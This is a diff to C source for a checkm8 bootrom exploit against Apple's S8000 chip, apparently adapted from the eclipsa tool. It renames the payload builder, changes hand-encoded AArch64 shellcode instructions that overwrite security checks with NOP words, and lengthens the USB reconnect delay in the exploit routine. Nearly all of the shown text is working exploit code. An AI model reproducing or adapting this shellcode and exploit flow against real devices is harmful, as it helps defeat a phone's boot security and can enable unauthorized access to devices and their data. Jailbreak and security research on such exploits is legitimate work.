@@ -7,7 +7,7 @@ static unsigned char blank[2048];
 static unsigned char payload[2048];
 static int payloadLen=2048;
 
-static int patch_payload(io_client_t client)
+static int make_payload(io_client_t client)
 {
     // 0x7ff's eclipsa style
     // original: https://github.com/0x7ff/eclipsa
@@ -51,14 +51,12 @@ static int patch_payload(io_client_t client)
     *shc++ = 0xd5033f9f; // dsb     sy
     *shc++ = 0xd5033fdf; // isb
     
-    *shc++ = 0x10000268; // adr     x8, INSN_NOP
+    *shc++ = 0x10000208; // adr     x8, INSN_NOP
+    
     *shc++ = 0xb9400109; // ldr     w9, [x8]
     *shc++ = 0xb9000269; // str     w9, [x19]
-    *shc++ = 0xb9400109; // ldr     w9, [x8]
     *shc++ = 0xb9000289; // str     w9, [x20]
-    *shc++ = 0xb9400109; // ldr     w9, [x8]
     *shc++ = 0xb90002a9; // str     w9, [x21]
-    *shc++ = 0xb9400109; // ldr     w9, [x8]
     *shc++ = 0xb90002c9; // str     w9, [x22]
     
     *shc++ = 0x9249f54a; // and     x10, x10, #0xff9fffffffffffff
@@ -140,7 +138,7 @@ int checkm8_s8000(io_client_t client)
     IOReturn res;
     transfer_t result;
     
-    if(patch_payload(client) != 0) {
+    if(make_payload(client) != 0) {
         ERROR("[%s] ERROR: Failed to generate payload!", __FUNCTION__);
         return -1;
     }
@@ -183,7 +181,7 @@ int checkm8_s8000(io_client_t client)
     LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_close(client);
     client = NULL;
-    usleep(10000);
+    usleep(100000);
     get_device_time_stage(&client, 5, DEVICE_DFU, true);
     if(!client) {
         ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
